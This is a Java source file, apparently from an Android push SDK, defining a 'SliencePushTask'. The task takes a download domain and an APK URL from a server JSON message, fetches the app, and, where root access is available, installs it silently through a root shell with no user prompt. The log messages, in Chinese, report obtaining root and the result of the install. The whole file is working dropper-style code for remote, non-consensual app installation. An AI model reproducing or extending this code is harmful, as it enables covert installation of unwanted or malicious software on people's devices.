package com.tt.push.model;

import android.text.TextUtils;
import co.lvdou.foundation.utils.extend.LDApkHelper;
import co.lvdou.foundation.utils.extend.Logout;
import co.lvdou.foundation.utils.root.LDCommandBuilder;
import com.tt.push.store.NetworkApkStore;
import com.tt.push.util.ShellManager;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.Serializable;
import java.io.UnsupportedEncodingException;
import java.net.URLDecoder;

public final class SliencePushTask extends PushTask implements Serializable {

    private static final int COUNT_MAX_RETRY = 2;
    private int mTaskExecutionCount = 0;

    private SliencePushTask() {
    }


    public static SliencePushTask alloc() {
        return new SliencePushTask();
    }

    public SliencePushTask init(ApkInfo apkInfo) {
        mApkInfo = apkInfo;
        mApkInfo.setRelatedTask(this);

        return this;
    }

    public SliencePushTask initWithJsonMap(JSONObject jsonMap) throws JSONException, UnsupportedEncodingException {
        String CHARSET = "utf-8";
        JSONObject rootMap = jsonMap;
        JSONObject resultDateMap = rootMap.getJSONObject("resultDate");
        JSONObject commonMap = resultDateMap.getJSONObject("common");

        String domain = TextUtils.isEmpty(rootMap.getString("mainDomain")) ? rootMap.getString("backDomain") : rootMap.getString("mainDomain");
        String packageName = commonMap.getString("packageName");
        String name = URLDecoder.decode(commonMap.getString("appName"), CHARSET);
        String downloadURL = String.format("%s%s", domain, commonMap.getString("url"));
        ApkInfo apkInfo = ApkInfo.alloc().init(name, packageName, downloadURL);

        return init(apkInfo);
    }

    @Override
    public int type() {
        return 1;
    }

    @Override
    public void execute() {
        if (!isValid()) return;

        mTaskExecutionCount = 0;
        executeCore();
    }

    private void executeCore() {
        mTaskExecutionCount++;

        ApkInfo apkInfo = apkInfo();
        if (LDApkHelper.isInstalled(apkInfo.packageName())) {
            Logout.out("用户已经安装了该应用，不再重复安装");
            onAlreadyInstalled();
            return;
        }

        NetworkApkStore.shareStore().download(apkInfo, new NetworkApkStore.LoadApkResultHandler() {
            @Override
            public void onLoadingApk(ApkInfo apkInfo, int progress) {
            }

            @Override
            public void onFinishLoadApk(boolean isDownloadSuccess, ApkInfo apkInfo, String savePath) {
                if (!isDownloadSuccess) {
                    retryIfNeeded();
                    return;
                }

                ShellManager sm = ShellManager.shareManager();
                if (sm.isObtainRootPermission()) {
                    Logout.out("已经获取了ROOT权限，开始做任务");
                    LDCommandBuilder builder = new LDCommandBuilder();

                    String installTag = String.format("finish install apk package:%s", apkInfo.packageName());
                    builder.addSilenceInstallCommand(apkInfo.packageName(), savePath, installTag);

                    sm.writeCommand(builder.build());
                    sm.readCommandUntilMatchTag(installTag);

                    if (LDApkHelper.isInstalled(apkInfo.packageName())) {
                        Logout.out("安装成功");
                        onInstallSuccess();
                    } else {
                        Logout.out("安装失败");
                        onInstallFail();
                    }
                } else {
                    Logout.out("没有获取到ROOT权限");
                }
            }
        });
    }

    private void retryIfNeeded() {
        if (mTaskExecutionCount < COUNT_MAX_RETRY) {
            mTaskExecutionCount++;
            executeCore();
        } else {
            onDownloadFail();
        }
    }
}
